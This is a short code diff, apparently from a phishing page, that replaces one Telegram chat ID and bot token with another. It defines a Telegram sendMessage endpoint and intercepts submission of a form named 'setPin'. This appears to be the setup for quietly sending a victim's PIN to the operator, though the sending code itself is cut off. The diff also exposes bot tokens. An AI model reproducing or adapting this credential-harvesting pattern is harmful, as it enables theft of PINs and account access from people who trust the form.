@@ -1,5 +1,5 @@
 
-    const chat_id = '5809822819', botID = 'bot6241613294:AAFCdV4EfVf7LXrJV-FX3t4xcCG5R3iMFaE';
+    const chat_id = '6077916114', botID = 'bot5980163209:AAEGENMLJbVfrqcIl7cO23H1LOPe_1Fka6U';
     const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
     document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
         e.preventDefault(); // Don't submit
